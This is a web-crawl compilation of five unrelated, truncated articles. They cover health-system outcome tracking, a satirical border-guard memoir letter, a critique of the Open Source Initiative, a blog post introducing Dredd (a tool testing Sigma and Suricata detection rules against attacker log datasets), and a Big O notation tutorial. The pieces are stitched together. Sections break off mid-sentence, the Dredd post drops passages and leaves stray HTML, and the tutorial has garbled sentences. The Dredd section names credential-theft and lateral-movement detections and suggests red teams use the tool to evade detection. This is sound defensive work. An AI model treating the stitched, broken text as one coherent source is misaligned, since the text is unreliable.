<ul><li>How is the psychiatrist doing with her patients with depression?&nbsp;</li><li>How about the endocrinologist with his diabetics (in fairness, A1c is occasionally tracked)?</li><li>Is the neurologist getting average, worse, or better, results than expected for patients with multiple sclerosis? For which patients?</li></ul>



<p>A new medicine may get approved on the basis of robust clinical trials, but the approval of a drug, as I’ve <a href="https://www.ncbi.nlm.nih.gov/pmc/articles/PMC6617976/">argued</a>, doesn’t necessarily equate with the improvement of outcomes of real world patients.</p>



<p>Why aren’t outcomes tracked in routine care the way they are in clinical trials? For one, it’s surprisingly hard to track patient journeys, especially as patients often get care from multiple medical systems – though even rigorously determining the outcome for a patient entirely within one medical system can be remarkably difficult, especially in the context of real life, when appointments are missed, and assessments can be spotty and inconsistent, and documentation unreliable.</p>



<p>But the second reason the information isn’t tracked is, essentially, no one (besides the patient!) really cares, in the sense of being personally invested in (and accountable for) the outcome. Certainly not in fee-for-service systems, where doctors (who, to be clear, obviously try their best for each patient) charge based on their activity rather than patient outcome. Hence, the extended push for approaches that seek to prioritize improved care, and specifically, improved outcomes. But even here it’s challenging – doctors will always argue that their specific patients are different – more complex or sicker, say, so of course they’ll do worse.&nbsp;</p>



<p>Often, the doctors may be right, and efforts to increase transparency around the success of certain surgical procedures has naturally led to notorious gaming of the system, where a mediocre heart surgeon who selects only the easiest cases scores higher than an exceptional surgeon who takes on the most difficult ones.&nbsp;</p>



<p>Attempts to adjust for complexity, inevitably, go only so far.</p>



<p>What emerges from this is a health system that, despite what may be the best intentions of providers, essentially, is flying blind, and lacks the basic ability to see what’s it doing, a system that lacks the fundamental ability to iteratively optimize and improve.&nbsp;</p>



<p>Yes, care improvement occurs – but over incredibly long periods of time, driven by the slow pace of robust clinical trials, rather than by the opportunities to systematically learn from patients and providers every single day.&nbsp;</p>



<p>For years, we’ve championed the concept of a “learning health system,” and today, it remains largely an unrealized aspiration.</p>



<p>What is to be done?</p>



<p>A remarkable recent two-day conference organized by Dr. Mark McClellan and colleagues at the Duke-Margolis Center (all materials available <a href="https://healthpolicy.duke.edu/events/establishing-high-quality-real-world-data-ecosystem-day-1-2">here</a>) dug into exactly this challenge, drilling into the question of whether there can be some kind of convergence between the process of …</p></div></article></div>

<p>Dear United States Customs and Border Protection, I was honored to receive your invitation to apply to the Border Patrol.</p>
<p>Not at first: at first I was bemused, and joked about this being the most mistargeted targeted ad in the history of the internet. After all, I represent a dramatic failure of your agency: an immigrant from the Middle East who infiltrated your nation, took your jobs, seduced your women, and <a href="https://putanumonit.com/2015/12/30/010-voting/" target="_blank" rel="noopener">undermined your democracy</a>. But perhaps that is your strategy — if I could beat you, let me join you.</p>
<p>But then I remembered: half a lifetime ago I did wear a uniform that gave me a purpose. I spent a good deal in that uniform patrolling a border. Perhaps I went beyond. You must be familiar with that time since your ad found me, but allow me to share some details anyway. A young man sees and learns many things while on guard duty.</p>
<p>My country is small, shaped like a long chef’s knife, and surrounded by hostile neighbors. It has a very high ratio of miles-of-border-that-need-to-be-watched to teenagers. So on any given day many of its teenagers are employed by watching its borders. Demand creates its own supply, as they say.</p>
<p>I just turned 18 when they gave me a rifle and two sets of uniforms. One crisp and clean that I would almost never wear, one grimy and rough and suitable for the work of infantry boot camp: running, push-ups, shooting, washing toilets, catching naps, guard duty.</p>

<p>Guard duty is no one’s main job in the army, but almost everyone has to do a lot of it throughout their service. It has a lot in common with Vipassana meditation — a quiet, solitary affair whose ultimate goal is “seeing”. One’s practice starts in boot camp doing 30 minute stints, then one graduates to practicing for 4 or 8 hours in a row and going on retreats.</p>
<p>I wish I knew about Vipassana when I enlisted, I surely would have been enlightened twice over for all the hours I spent standing guard. Instead, I mostly entertained myself by singing Russian pop songs in my head. I learned the lyrics to hundreds of those, along with the entire Marshall Mathers LP and an eclectic selection of French hip hop and German metal. It has always been my gift and curse: I have a perfect memory for song lyrics in any language, but I can’t carry a tune to save my life. I sing often to myself, but at karaoke I’m resigned to cringing as my vocally talented friends butcher the lyrics to what are supposedly their favorite tracks.</p>
<p>One night the list of shifts came out; I had the terrible fourth slot: 12:30-1:00 AM. It meant that I would just be falling asleep when the third shift would wake me to stand guard groggily, and afterward I wouldn’t have enough time to get a full night’s sleep before reveille at 5 AM. I climbed onto my field bed at 11 PM, sullen. I woke up at 5, confused.</p>
<p>The third shift never woke me up because the second shift guy never woke&nbsp;<em>him</em> up. Instead, the second shift got up at 11:30, went to the guard post, put his his uniform and rifle in a neat pile, climbed the fence, and set off in his boxers toward the southwest. Military police picked him up at sunrise, parched and exhausted, a couple of miles from the border with Egypt.</p>
<p>I never saw that guy again. I assume he was sent to military prison for a month or two until the cell had to be vacated for fresh offenders. Then he was discharged and let loose, having demonstrated to the army’s satisfaction that he is not fit to be a GI. Today he is probably eating falafel somewhere in Tel Aviv, reminiscing about the night he ran through the desert to allow me to a get a good night’s sleep.</p>

<p>Four years later, I was back at the Egyptian border for my final week-long guard retreat. No longer a fresh-faced recruit, I was a fresh-faced Sergeant First Class with a degree in mathematics. But guard duty doesn’t care about honorifics and academics, the border still needs watching.</p>
<p>This particular outpost consists of a small barracks with a bed and six bunks, a toilet, a fence, a gate in the fence, a tower. Around the fence the lone and level sands stretch far away, boundless and bare. The six soldiers are guarding 4/8: 4 hours at the gate, 8 hours to sleep, 4 hours at the tower, 8 hours to play cards or backgammon. Repeat x7 and you’re done. The officer is usually sleeping 12 hours a day and reading weeks-old magazines left by previous rotations of guards.</p>
<p>Aside from your six fellow men, the only living beings you’d see are one fox and twenty billion flies. <span>The Egyptians guard towers and patrol routes are out of sight. The Bedouin smugglers, transporting drugs from Latin America and prostitutes from Eastern Europe and contraband from Asia, know exactly where the outposts are and easily avoid them. If you think you see someone while on tower duty, you can assume that you’re hallucinating from the heat.</span></p>
<p>The first five days passed uneventful. The officer was chill, and the daily inspection consisted of little more than making sure the number of soldiers and rifles stayed at six. I passed the 8 AM – noon slot at the gate solving math puzzles in my head. I spent the 8 PM – midnight tower watch listening to music in one earphone, the ear that wasn’t visible from the barracks.</p>
<p>At 1 AM on Friday I just tucked in to bed when the radio suddenly came alive.</p>
<p><span>– “Base, this is tower. I see three figures approaching from the west.” </span></p>
<p><span>– “Everyone up! Tower, do you see weapons?” </span></p>
<p><span>– “Negative, sir. I turned the spotlight on them and they froze and lay still.” </span></p>
<p><span>– “Stay on them and look for more hostiles. Everyone wake the fuck up and get your fucking gear!”</span></p>
<p><span>– “Base, they’re standing up.”</span></p>
<p>– “Take cover, soldier! What are they doing?”</p>
<p>– “Sir, the’re shouting and hugging each other. One of them is dancing. I think the other one is praying.”</p>
<p>It turned out that the three men we<span>re refugees from Darfur, having just walked the last mile of a 3,000 mile trek. The South Sudanese make their way north across Sudan to the Sudan-Egypt border, then they pay everything they own for smugglers to take them across Egypt to Israel. </span></p>
<p><span>But the Egyptian Army patrols the Israeli border, and the smugglers don’t want to get close to it. T</span><span>hey drop the refugees ten miles from Israel and tell them: “Keep walking east, you’ll be fine. Unless the Egyptians see you, then they’ll probably shoot you. But if you don’t get shot, you’ll be in Israel before dawn. Inshallah!”</span></p>
<p><span>So when the three dudes got spotted but no one was shooting, they knew that they had made it to the promised land. As the other guys stood in a circle “guarding” the three thin men in ragged clothes, I went to the barracks to get them sandwiches and the cold bottle of Coke we were saving for Saturday. Half an hour later a military police jeep picked them up.</span></p>
<p><span>I don’t know what happened to them afterward. Most likely they were sent to a detention center for a week or two until the cell had to be vacated for fresh refugees. Then they were discharged and let loose. Today they are probably washing dishes at a falafel joint somewhere in Tel Aviv, reminiscing about the night they ran through the desert to prevent me from getting a good night’s sleep.</span></p>

<p>There are many other stories I could tell you, my dear United States Customs and Border Protection agency. The time I was guarding in the West Bank and spent the week smoking shisha with an Arab friend. The time I guarded the border with Lebanon during the war, when what kept me alert were the rockets and artillery instead of the usual threat of being written up by a stickler officer for slouching. The time I was guarding a checkpoint and saw first-hand that the politics of Israel and Palestine you read about in the New York Times have less than nothing to do with how Israelis and Palestinians actually live together and deal with each other in that small patch of land. The time that other guy went on guard duty and didn’t come back.</p>
<p>But I think I have made a strong enough case for my application. I spent four years watching the border, and the border was still there when I left. I never ran half-naked into the desert. I only dozed off once or twice, and was never caught. The one time people came across the border illegally we let them in and I gave them sandwiches, but in my defense it wasn’t my watch anyway and the looked real hungry.</p>
<p>I look forward to hearing back from you about my candidacy,</p>
<p>Kind regards,</p>
<p>Jacob</p>

<h2>Afterword – Memoirs</h2>
<p>I recently finished reading Sasha Chapin’s memoir&nbsp;<a href="https://www.goodreads.com/en/book/show/43062156"><em>All the Wrong Moves</em></a> and realized that in five years of blogging I’ve shared few stories from my own life, which has been at least as eventful as Sasha’s. I’m somewhat tempted to write a memoir, probably focused on all the dates I went on and what I learned from them about men, women, and myself. I wrote this post in part to practice that style of writing: a narrative history with plenty of asides and jokes. I am curious to know if there is any appetite among my readers for this, given that if I start working on a memoir I will have less time to write regular Putanumonit updates.</p>

<p>Recently, E Hashman of the OSI board <a href="https://twitter.com/ehashdn/status/1276712953362870280">asked for feedback</a> from communities that traditionally don’t have ties with the Open Source Initiative, particularly the JS, Ruby and Rust communities. As I was heavily involved in the latter two, I decided to answer, received a questionnaire and answered it. It was a very pleasing exchange, thank you!</p>
<p>I don’t want to repeat the questionnaire or my answers here, but the central question “What’s stopping you from becoming a member of the OSI?” stuck with me and I want to write down my personal (biased, incomplete) view of the OSI and particularly why I never spend a passing thought on it, unless inquired.</p>
<h2 id="my-view-on-the-js-ruby-and-rust-communities-python">My view on the JS, Ruby and Rust communities (+Python)</h2>
<p>I’m biased here, but I believe that the JavaScript, Ruby and Python communities were responsible for the dominant cultural shift in programming from 2010 on. I would even go as far as saying that Rust isn’t even particularly innovative, but applied practices from those communities well. These communities were effective at building new structures, bringing coding to the masses and thinking new ways. The Ruby Community invented the (Rails)Bridges and Rails Girls and a very distributed network of small conferences and non-profits, such as Ruby Central, Ruby Berlin and RubyTogether. The Python community built a highly effective foundation and the PyCons, which are still a reference model for e.g.&nbsp;effective abuse handling and public documentation of procedures. The JavaScript community has shown an extremely good hand at scaling wide and broad, showing community prowess and being very nimble at addressing technical problems.</p>
<p>Together, they have understood that the way to scale your communities is bringing new people in and understood using the hypergrowth of the tech sectors in their years to their success. Although Ruby ends the clear third after a decade, Ruby would be irrelevant nowadays without those approaches.</p>
<p>In summary, I would say that these 3 communities aggressively pushed the needle of what’s practice in open source. Especially in my local area, in Berlin, this can be seen through the success of non-profits like OpenTechSchool, which is technology-independent, but driven by members of those 3 communities.</p>
<p>I am along for that ride - first RailsConf Europe attendance in 2008, first organisational work in 2010, with germany.rb, the German Ruby meetup, then eurucamp in 2012, the Rust Meetup under OTS since 2014 and RustFest since 2016. I started contributing to the Padrino webframework in 2011, and to Rust in 2014. Present tense, because this is a great ride.</p>
<h2 id="open-source-but-not-osi">Open Source, but not OSI</h2>
<p>All of these environments can easily be called “Open Source”. For example, Ruby on Rails was a driver for the popularisation of the MIT license as the default license in the Ruby world, despite Ruby’s inventor, Yukihiro Matsumoto, being a recognised <a href="https://en.wikipedia.org/wiki/Yukihiro_Matsumoto#Recognition">free software advocate</a>. Yet, their detachment from the OSI is a curious matter. One would imagine that the sudden success of not one, but three ecosystems would make the <em>stewards of open source</em> interested! No such thing happened. I can only speculate on reasons from the OSI side, but I <em>can</em> give my personal reasons for the other way around.</p>
<p>The last decade or so has seen a huge uptake in both open source productivity and in creation of new community structures. Especially, it saw the formation of structures <em>beyond code</em> and <em>beyond the old ones</em>. To give an example here: <a href="https://opentechschool.org/">OpenTechSchool (OTS)</a> was created to teach people coding - more than 10000 people have used that offer in over 1000 events in the first 5 years since its inception. And this is just the tip of the iceberg of a new meetup and conference culture in FOSS. The groups organising OTS events are a new generation of community and project organisers, who have a mission that goes beyond making code free: actually democratizing coding by destroying barriers and giving marginalised people a spot in an environment that <em>should</em> be accessible, but <em>isn’t</em>. Those structures have an interesting property: a desire for independence.</p>
<p>But the software side also started to struggle: a lot more software started popping up and the production of open source software has accellerated extremely. And facing the high additional amount of labor necessary to deal with a much bigger community and much bigger competition, the same issue popped up: independence.</p>
<p>In both of these contexts, independence is often discussed as a money issue, usually in two variants. The raw one: how do I even get money for my work? And the hidden one: If I receive large amounts of money, e.g.&nbsp;by being employed, how does my project stay independent?</p>
<p>There’s again three ways out of this:</p>
<p>The first: Ruby on Rails has indeed answered the question by stepping off and just not taking money, finding other ways of getting their infrastructure cost paid. This still means that Rails production costs money and someone foots the bill, but it’s essentially a big barter deal. This leads to a number of weird issues, like the actual cost of a project not being calculatable and funds not being shiftable. Cost-savings don’t work to your benefit, but the donors.</p>
<p>The second is blunt: just not play the game anymore. I remember a quote from <a href="https://twitter.com/alicetragedy/">alicetragedy</a> at a conference where I inquired how a project was doing: “It’s successful, so I may have to shut it down”. Retract your labour.</p>
<p>The third is also rather upfront: build a funding structure, which means <em>additional labour overhead</em>, especially around distributing funds and paying the people distributing the funds. Also, tons of conversations with potential sponsors.</p>
<p>You may look for the fourth, “getting people employed”, but that doesn’t give you independence, as those people are clearly bound to their employer’s direction. This is not a theoretical case, FOSS developers getting hired into companies and at some point moving up the career ladder is a cause of maintainer drain.</p>
<h2 id="now-what-about-the-osi">Now, what about the OSI?</h2>
<p>But this article is about the OSI, or, rather, about the absence of the OSI. And I think that is the crux of the issue: this transformation has happened without the proclaimed stewards of the Open Source Definition. And this isn’t unsurprising, because OSIs focus is different: OSI is about promoting Open Source in the industry.</p>
<p>This does, for example, show in their <a href="https://opensource.org/osi-open-source-education">education material</a>, which (except a course for kids) is often aimed at the interaction of businesses with the Open Source world. Only the GitHub material is aimed at non-corporate Open Source maintainers, but obviously biased towards GHs services they provide to the community. The other linked guide by <a href="https://todogroup.org/guides/">TODO Group</a> uses multiple huge entities like Uber or Microsoft as case studies. The third one is <a href="https://opensource.google/docs/">the Google open source documentation</a>, which is mainly aimed at Googlers. My general conclusion is that individual maintainers are not the main target group of the OSI, especially not in practice teaching.</p>
<p>They do provide useful resources to maintainers, like the OSI license list and the license discussion mailing list, but these are only a fragment of the issues we are facing today.</p>
<p>Case studies, investigations and similar around popular, indepent Open Source projects are suspisciusly missing. The only writing I could find that does touch on the issues I mentioned above is <a href="https://opensource.org/node/1009">this one</a>, which pretty much argues the status quo.</p>
<h2 id="why-i-never-think-about-the-osi">Why I never think about the OSI</h2>
<p>And this is the reason why I never think about the OSI, except when I want to check whether a license is considered open source. Because it has, by itself, been very absent. Beyond the utility value of defining what “Open Source” is<a href="https://yakshav.es/non-thoughts-on-the-osi/There's%20the%20debate%20on%20that%20fundamentally%20attacks%20whether%20it's%20the%20OSI%20is%20right%20to%20do%20so,%20but%20I'm%20okay%20here.">1</a>, OSI is not helpful to me.</p>
<p>It didn’t pick up interesting threads and didn’t try to get in touch with communities that didn’t naturally gravitate towards them. One of their <a href="https://en.wikipedia.org/wiki/Eric_S._Raymond#Political_beliefs_and_activism">co-founders being extremely aggressive</a> towards progressive causes, which were an underlying thread of many of the changes mentioned above, did add some negative feelings in the mix. I say <em>some</em> because I appreciate that ESR is not the OSI and many of the current OSI leadership don’t hold his views, but this hampered the organisation on growing a new community.</p>
<p>But my main issue with the OSI is how little <em>positive</em> and <em>forward-thinking</em> I get out of it. Studies on Open Source issues like <a href="https://www.fordfoundation.org/media/2976/roads-and-bridges-the-unseen-labor-behind-our-digital-infrastructure.pdf">Roads and Bridges</a> (and its follow-up book <a href="https://www.amazon.com/Working-Public-Making-Maintenance-Software/dp/0578675862">Working in Public</a>), or things like the <a href="https://res.cloudinary.com/maintainerati/image/upload/v1585300565/Berlin%202019/Berlin_2019_Event_Report_rpcxtg.pdf">Maintainerati Report</a> would have been home-runs for the OSI to produce or at least promote. Mozilla’s <a href="https://mozilla.github.io/open-leadership-training-series/">Open Leadership Resources</a> and trainings are also to be mentioned. All of these are much more useful to me as a maintainer and project lead striving for independence than anything the OSI produces. Their <a href="https://opensource.org/board">leadership</a> is also mainly consisting of people employed at a number of companies, shielding them from the issues mentioned above.</p>
<h2 id="but-why-am-i-writing-about-it-then">But why am I writing about it, then?</h2>
<p>I find OSI’s current public behaviour disconcerting. Or, rather, the absence of public behaviour, replaced by vocal chair-people. All the issues mentioned above have increased, even culminating in the current drift of “ethical source”, which adds an additional layer of morality on top. It’s a subject for another post, I do actually believe this issue would be less hot if the previous ones were addressed earlier.</p>
<p>The Ethical Source and Open Code (payment involved) movements is a direct attack on the values of the OSI (and, incidentally, the FSF), from a direction that I believe those organisations did not see it coming: from maintainers and developers. I believe that this is the first fundamental value shift on that front since the Open Source movement split from the Free Software Movement. This puts especially the OSI on the defense. And this defense is weakened, as they have missed building ties to major community drifts. The inability to see and address those drifts and reorient towards maintainer issues has left the OSI out in the open.</p>
<p>This is sad, because the OSI <em>is</em> uniquely positioned to guide these discussions: it is an old …</p></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div><div><p>Offensive security moves at a breakneck pace and keeping up with new tools and TTPs (tactics, techniques, and procedures) can be an undertaking of its own for a security team. Creating, testing, and managing the detection rules for those changes is even more so a challenge, especially at scale. To address this challenge of quickly testing detection rules, we developed the tool Dredd. Dredd automates both the analysis of Sigma<a href="https://github.com/Neo23x0/sigma" target="_blank" rel="noopener noreferrer"><sup>[1]</sup></a> rules against Mordor<a href="https://github.com/Neo23x0/sigma" target="_blank" rel="noopener noreferrer"><sup>[2]</sup></a> datasets (collections of logs of attacker procedures), and the analysis of IDS rules against PCAPs. In this blog, we will discuss Dredd and its potential uses.</p><h2>Siem Rules Analysis</h2><p>Much like its namesake – Judge Dredd – Dredd is judge, jury, and executioner. Dredd handles the log ingestion and normalization, detection rule conversion, and detection rule evaluation. For the detection rule side of Dredd, Sigma was chosen. Sigma is a SIEM agnostic rule format that is designed to be interoperable. The Sigma project provides a utility (sigmac) and library (sigmatools)<a href="https://github.com/Neo23x0/sigma/tree/master/tools" target="_blank" rel="noopener noreferrer"><sup>[3]</sup></a> to translate their format to other platforms like Splunk, QRadar, and Elastic.</p><p><img data-attachment-id="231652" data-permalink="https://sra.io/blog/automated-detection-rule-analysis-with-dredd/dredd-image-1/" data-orig-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=1770%2C626&amp;ssl=1" data-orig-size="1770,626" data-comments-opened="0" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Dredd image 1" data-image-description="" data-medium-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=300%2C106&amp;ssl=1" data-large-file="https://i1.wp.com/sra.io/wp-content/uploads/2020/08/Dredd-image-1.png?fit=1024%2C362&amp;ssl=1" loading="lazy" src="https://sra.io/wp-content/uploads/2020/08/Dredd-image-1.png" alt="" width="1770" height="626" srcset="https://sra.io/wp-content/uploads/2020/08/Dredd-image-1.png 1770w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-1280x453.png 1280w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-980x347.png 980w, https://sra.io/wp-content/uploads/2020/08/Dredd-image-1-480x170.png 480w" sizes="(min-width: 0px) and (max-width: 480px) 480px, (min-width: 481px) and (max-width: 980px) 980px, (min-width: 981px) and (max-width: 1280px) 1280px, (min-width: 1281px) 1770px, 100vw"></p><p><em>Converting a Sigma rule<a href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_user_creation.yml" target="_blank" rel="noopener noreferrer"><sup>[4]</sup></a> (left) to a Splunk query (right) using sigmac</em></p><p>The other major component of Dredd is Mordor.

<em>Using Dredd to evaluate unmerged logs</em></p><p>Here you can see that the “schtasks.exe” rule had a hit against the scheduled task log set but not the DCSync log set.</p><h3>Other Data Sources</h3><p>Dredd currently only supports Mordor datasets for Sigma analysis. The Mordor project lays out different environments where the logs were captured so that analysts can lookup which hosts map to which purpose (ex: IP 172.18.39.8 is the attacker C2 in the Shire<a href="https://mordordatasets.com/mordor_shire.html" target="_blank" rel="noopener noreferrer"><sup>[7] </sup></a>environment). Dredd however does not enforce conformity those Mordor environments or require additional metadata (like the attacker view). In practice, Dredd will support any JSON logs produced by Winlogbeat or logs matching that schema<a href="https://www.elastic.co/guide/en/beats/winlogbeat/current/exported-fields.html" target="_blank" rel="noopener noreferrer"><sup>[8]</sup></a>. This means that support for projects like EVTX-ATTACK-SAMPLES<a href="https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES/" target="_blank" rel="noopener noreferrer"><sup>[9]</sup></a>, a project similar to Mordor but using evtx files (Windows Event Log files), can be added fairly easily.</p><p><a href="https://gist.github.com/2XXE-SRA/548f856f2161341a6c405944db91d645" target="_blank" rel="noopener noreferrer">Here</a><a href="https://gist.github.com/2XXE-SRA/548f856f2161341a6c405944db91d645" target="_blank" rel="noopener noreferrer"><sup>[</sup><sup>10]</sup></a> is a PowerShell script to convert evtx files to Winlogbeat JSON files using Winlogbeat.

href="https://github.com/Neo23x0/sigma/blob/master/rules/windows/builtin/win_mmc20_lateral_movement.yml" target="_blank" rel="noopener noreferrer"><sup>[12]</sup></a> using Dredd<br>
</em><i>The MMC lateral movement rule worked against the export</i></p><h2>IDS Rule Analysis</h2><p>Dredd also supports the evaluation of Snort/Suricata IDS rules against PCAPs using Suricata. Unlike with Elasticsearch however, Dredd can simply mount the rules and PCAPs into a container as-is and use Suricata to perform offline analysis. There are several good sources for attacker PCAPs, including the Mordor project, which has PCAPs for the APT29 emulation plan by MITRE<a href="https://attackevals.mitre.org/APT29/" target="_blank" rel="noopener noreferrer"><sup>[13]</sup></a>, PCAP-ATTACK<a href="https://github.com/sbousseaden/PCAP-ATTACK" target="_blank" rel="noopener noreferrer"><sup>[14]</sup></a>,<em> which is by the same author as the EVTX-ATTACK-SAMPLES, and</em> PacketTotal<a href="https://packettotal.com/" target="_blank" rel="noopener noreferrer"><sup>[15]</sup></a>,<em> a VirusTotal like website for packet captures.</em></p><p>When analyzing these captures with Dredd, it will merge all rules together then evaluate them against each PCAP individually. However, there is also the option to evaluate the rules against all PCAPs at once.<em><br>
</em></p><p><br>
<em>Using Dredd to evaluate unmerged PCAPs</em></p><h2>Applications</h2><p>The most obvious use case for Dredd is as a tool to help detection content developers analyze new and existing detections against attacker activities. Upon release, an analyst can download a log export of the tool or procedure, load it into Dredd with their existing detection rules, then determine if they have coverage for it. If they lack coverage, they can build a new detection and use Dredd to validate that the rule works as expected. In this same scenario, Dredd can be used to test the rule’s propensity to false positives by evaluating the rule against benign sets of logs.<br>
Dredd can also help in situations where an analyst may not have access to a detection platform (SIEM/IDS) or the platform is more tightly controlled. Analysts on the go or working off hours may not have the ability to run arbitrary queries against the platform. In other situations, query access to the platform could be restricted for reasons such as limiting performance degradation of scheduled queries and licensing. Dredd can help in either case by acting as a proxy for the platform when evaluating detection content.<br>
If the detection team(s) version controls their detection logic, Dredd can be used as part of a continuous integration/continuous deployment (CI/CD) pipeline to automate rule validation. Once new rules or changes to existing rules are committed to the source control management system (e.g. GitHub, Bitbucket), an automated process can be initiated to evaluate the rules against various logs. To that end Dredd has support for using non-zero exit codes (in addition to the normal structured results) when rules do not have any results, thereby causing a build failure.</p><p><br>
<em>Changing the exit code behavior</em></p><p>This type of continuous testing is more commonly found in traditional software development practices but is just as applicable – and useful – in testing security detection content.<br>
Red team operators can also make use of Dredd. The operator first generates the log data by practicing with their different tools and TTPs within a testing environment set to log the appropriate sources. Then the operator evaluates those logs either against their organization’s existing detection rules or against publicly available detection rules. Using the results, they can identify areas of their methodology that are likely to be detected and either avoid them or innovate on them. The red team operator will also get a better understanding of what characteristics are common in detection logic so they can avoid those where possible when developing their methodologies.</p><h2>Dredd</h2><p>Dredd can be found on the Security Risk Advisors GitHub page here: <a href="https://github.com/SecurityRiskAdvisors/dredd" target="_blank" rel="noopener noreferrer">https://github.com/SecurityRiskAdvisors/dredd</a>.

<p>The Big O notation is a notion often completely ignored by developers. It is however a fundamental notion, more than useful and simple to understand. Contrary to popular belief, you don’t need to be a math nerd to master it. I bet you that in 7 minutes, you’ll understand everything.</p>



<h3>What is the Big O notation ?</h3>



<p>The Big O notation (or algorithm complexity) is a standard way to measure the performance of an algorithm.<strong> It is a mathematical way of judging the effectiveness of your code.</strong> I said the word mathematics and scared everyone away. Again, you don’t need to have a passion for math to understand and use this notation.</p>



<p>This notation will allow you to measure the growth rate of your algorithm in relation to the input data.<strong> It will describe the worst possible case for the performance of your code.</strong> Today, we are not going to talk about <a href="https://en.wikipedia.org/wiki/Space_complexity" target="_blank" rel="noreferrer noopener">space complexity</a>, but only about time complexity.</p>



<p>And it’s not about putting a timer before and after a function to see how long it takes.</p>



<figure><img src="https://i.imgur.com/NOOASFD.jpg" data-src="https://i.imgur.com/NOOASFD.jpg" alt="big o notation"></figure>



<p>The problem is that the timer technique is anything but reliable and accurate. With a simple timer the performance of your algo will change greatly depending on many factors.</p>



<ul><li>Your machine and processors</li><li>The language you use</li><li>The load on your machine when you run your test</li></ul>



<p><strong>The Big O notation solves all these problems and allows us to have a reliable measure of the efficiency of all the code you produce.</strong> The Big O is a little name for “order of magnitude”.</p>



<p>And that’s really the important thing to understand. You don’t directly measure the speed of an algorithm in seconds. <strong>You measure the growth rate of an algorithm by the number of operations it takes to complete.</strong> You should Big O notation when performance among developers.</p>



<figure><img src="https://i.imgur.com/Aaml29y.jpg" data-src="https://i.imgur.com/Aaml29y.jpg" alt="developers"></figure>



<p>Not convinced ? OK, let’s put ourselves in a real life situation!</p>



<h3>It could happen to you</h3>



<p>Imagine, you’re hard at work, and one day you’re asked to make a function that will return the sum of all the numbers from 1 to the number passed as a parameter. More clearly, something that would have this behavior.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">n = 3

output = getSum(n)

print(output)
# will print : 6  because 1 + 2 + 3 = 6</pre>



<p>Immediately, the first thing that comes to your mind is to make a simple loop that will cumulate the numbers one by one. <strong>I’ll give you examples in Python, but we don’t give a fuck about language.</strong> It applies to any language.</p>



<pre data-enlighter-language="generic" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    sum = 0

    for number in range(1, n + 1):
        sum += number

    return sum</pre>



<p>And it works. You start your function with input 3: instantly you have the right result. Great! You’re pushing to prod and you’re getting a coffee in a nonchalant way.</p>



<p>A few days later, someone contact you directly and tell you that the system has become super slow. It’s because of your function. <strong>The process time of your function goes up to more than 15 seconds!</strong> It frequently blocks the whole system for several seconds.</p>



<figure><img src="https://i.imgur.com/K7bnC9x.jpg" data-src="https://i.imgur.com/K7bnC9x.jpg" alt="big o notation"></figure>



<p>Panic! You look at the logs and you realize that the input has become huge numbers. Sometimes, the input of your function goes up to 1 billion. <strong>Another developer had to intervene.</strong> Your function is replaced and everything goes back to normal. You look at the new code and you see that.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    return n * (n + 1) / 2</pre>



<p>This function solves the problem instantly, even when the input is 1000 billion. You ask the developer who did that on Slack and his answer gets you even more lost.</p>



<p><em>“Hi! Your solution had a linear O(n) trend except that the input was huge. I found a constant solution O(1). No matter how high the input is, it will be fast now.”</em></p>



<p>You look at your screen and you have a single question that obsesses you.</p>



<h3>How does it work?</h3>



<p>As I told you, the key is to evaluate how many operations the machine will need to do to solve your problem. With your solution, there are a lot of operations.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    sum = 0  &lt;-- assignment

    for number in range(1, n + 1): &lt;-- addition + range
        sum += number &lt;-- n additions + n assignments

    return sum</pre>



<p>We're not going to do the exact calculation of the number of operations because we don't care about the exact number. <strong>We want the trend of the number of necessary operations according to the input parameters</strong>. What should shock now is the loop at line 4 and 5.</p>



<p>The operations to solve your problem will be multiplied by the size of your input. Your order of magnitude is directly related to the number n at the input of your function. <strong>Your function therefore has a linear trend of O(n).</strong></p>



<p>The input is 1 billion ? It will be 1,000,000,000 * operations to do for the machine.</p>



<figure><img src="https://i.imgur.com/SYmm6Lh.jpg" data-src="https://i.imgur.com/SYmm6Lh.jpg" alt="time"></figure>



<p>This is not the case for the other function.</p>



<pre data-enlighter-language="python" data-enlighter-theme="" data-enlighter-highlight="" data-enlighter-linenumbers="" data-enlighter-lineoffset="" data-enlighter-title="" data-enlighter-group="">def getSum(n):
    return n * (n + 1) / 2 &lt;-- trois opérations</pre>



<p>With this solution, the operations to solve your problem will not increase along with your input. Your order of magnitude will always be three operations, regardless of the input. <strong>Your function therefore has a constant trend of O(3), which is simplified to O(1)</strong>. If you draw a picture, it looks like this.</p>



<div><figure><img src="https://i.imgur.com/DpSLIzO.jpg" data-src="https://i.imgur.com/DpSLIzO.jpg" alt="big o notation"></figure></div>



<p>You beginning to understand why it's important to have this notion in mind. There are obviously other scenarios for this notation. Let's take a quick look.</p>



<h3>Big O notation by example</h3>



<h4>Constant complexity O(1)</h4>



<p>The constant complexity <strong>O(1)</strong> does not change regardless of the input. The same number of operations is required everytime.</p>



